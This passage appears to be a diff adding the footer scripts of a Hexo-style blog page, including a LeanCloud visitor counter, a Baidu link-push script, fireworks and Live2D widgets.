+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("TSaUMM9qwI423iWuECxQWDDh-gzGzoHsz", "2DucY6TQAx8iNNnjFYelMbXV");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  
+
+  
+
+  
+
+  
+  <script type="text/javascript" src="/js/src/exturl.js?v=5.1.4"></script>
+
+
+  
+  
+ <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+ <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+ <script type="text/javascript" src="/js/src/fireworks.js"></script>
+
+
+<div class="bg_content">
+<canvas id="canvas"></canvas>
+</div>
+<!-- 雪花特效 -->
+<!--<script type="text/javascript">
+
+    document.write('<script type="text/javascript" src="/js/src/snow2.js"><\/script>');
+
+</script>-->
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"left","width":100,"height":200},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<script type="text/javascript" src="/js/src/dynamic_bg.js"></script>
